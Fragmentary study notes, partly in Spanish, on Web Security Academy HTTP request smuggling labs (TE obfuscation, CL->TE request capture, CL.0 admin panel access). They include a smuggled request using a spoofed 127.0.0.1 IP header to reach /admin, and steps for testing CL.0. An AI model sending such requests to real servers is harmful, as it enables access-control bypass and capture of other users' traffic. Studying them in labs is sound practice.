...
### LAB: Transfer Encoding Ofuscation Header
...
+ X-nSaubQ-Ip: 190.242.107.22 pero admin accesible solo a través de la interfaz local. 
...
POST / HTTP/1.1
X-nSaubQ-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=POST /admin HTTP/1.1
Host: ID-LAB.web-security-academy.net
```

### LAB: CL->TE To Capture Other Users Requests
...
![[Pasted image 20250219154352.png]]
...
### LAB: C2.0 request smuggling `admin panel`
...
* Test endpoints vulnerable to ignore Content-Length Add two requests to a group and send in `parallel single connection` both Change the `Connection` header of the first request to `keep-alive` If vulnerable, recieve a 404 ->
#### 1st Request -> 
`
```js
POST /resources/labheader/images/logoAcademy.svg HTTP/1.1
